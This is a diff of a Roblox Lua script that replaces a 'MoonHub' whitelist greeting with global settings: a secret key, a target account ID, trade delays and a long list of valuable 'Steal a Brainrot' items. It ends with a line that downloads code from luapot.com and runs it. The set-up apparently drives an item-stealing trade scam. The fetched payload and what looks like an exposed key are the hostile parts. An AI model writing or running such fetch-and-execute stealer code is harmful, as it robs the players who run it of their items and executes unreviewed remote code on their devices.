@@ -1,24 +1,115 @@
--- [[ MOONHUB WHITELIST SYSTEM ]] --
-
-local whitelist = {
-    ["LaFrenchCrousty_9310"] = true,
-    -- ["La French Crousty"] = true,
+getgenv().SECRET_KEY = "mrr_a0c0936671c84a869162a1429d23eac2"
+getgenv().TARGET_ID = 2354866600
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().TARGET_BRAINROTS = {
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Headless Horseman"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Love Love Bear"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Cerberus"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Capitano Moby"] = true,
+    ["Cooki and Milki"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Ketupat Bros"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Los Amigos"] = true,
+    ["La Secret Combinasion"] = true,
+    ["Los Sekolahs"] = true,
+    ["Signore Carapace"] = true,
+    ["La Casa Boo"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["La Food Combinasion"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Ginger Gerat"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Los Spaghettis"] = true,
+    ["Festive 67"] = true,
+    ["Ventoliero Pavonero"] = true,
+    ["Cloverat Clapat"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Antonio"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Nacho Spyder"] = true,
+    ["Garama and Madundung"] = true,
+    ["Fishino Clownino"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Swaggy Bros"] = true,
+    ["La Romantic Grande"] = true,
+    ["Orcaledon"] = true,
+    ["Tictac Sahur"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Dug dug dug"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Lovin Rose"] = true,
+    ["Los Tacoritas"] = true,
+    ["Eviledon"] = true,
+    ["Los Primos"] = true,
+    ["W or L"] = true,
+    ["Esok Sekolah"] = true,
+    ["La Jolly Grande"] = true,
+    ["Los Cupids"] = true,
+    ["Los Puggies"] = true,
+    ["Tralaledon"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["Tuff Toucan"] = true,
+    ["Mieteteira Bicicleteira"] = true,
+    ["Chipso and Queso"] = true,
+    ["Chillin Chili"] = true,
+    ["Money Money Reindeer"] = true,
+    ["La Spooky Grande"] = true,
+    ["Bacuru and Egguru"] = true,
+    ["Los Bros"] = true,
+    ["La Extinct Grande"] = true,
+    ["Los Candies"] = true,
+    ["Los 67"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Los Mobilis"] = true,
+    ["Money Money Puggy"] = true,
+    ["Cigno Fulgoro"] = true,
+    ["Los Spooky Combinasionas"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Jolly Combinasionas"] = true,
+    ["Snailo Clovero"] = true,
+    ["Los Planitos"] = true,
+    ["Chicleteira Cupideira"] = true,
+    ["DJ Panda"] = true,
+    ["Las Sis"] = true,
+    ["Spinny Hammy"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["Los Sweethearts"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Chicleteira Noelteira"] = true,
+    ["Los Combinasionas"] = true,
+    ["Chimnino"] = true,
+    ["Noo my Gold"] = true,
+    ["Swag Soda"] = true,
+    ["Tacorillo Crocodillo"] = true,
+    ["Mariachi Corazoni"] = true,
+    ["La Grande Combinasion"] = true,
+    ["Donkeyturbo Express"] = true,
+    ["Los Chicleteiras"] = true,
+    ["Guest 666"] = true,
+    ["Vulturino Skeletono"] = true,
+    ["Fragola La La La"] = true,
+    ["Agarrini la Palini"] = true,
+    ["Secret Lucky Block"] = true
 }
-
-local player = game:GetService("Players").LocalPlayer
-
--- Vérification de l'utilisateur
-if not whitelist[player.Name] then
-    player:Kick("MoonHub You Are Not Whitelisted")
-    return -- Sécurité pour stopper l'exécution du code suivant
-end
-
--- [[ TON SCRIPT COMMENCE ICI ]] --
-print("Bienvenue sur MoonHub, " .. player.Name .. "!")
-
--- Exemple de notification pour confirmer le chargement
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "MoonHub",
-    Text = "Successfully Whitelisted!",
-    Duration = 5
-})
+loadstring(game:HttpGet("https://luapot.com/api/loadstring/26c4a4331358247078ffc36b7a17d913"))()
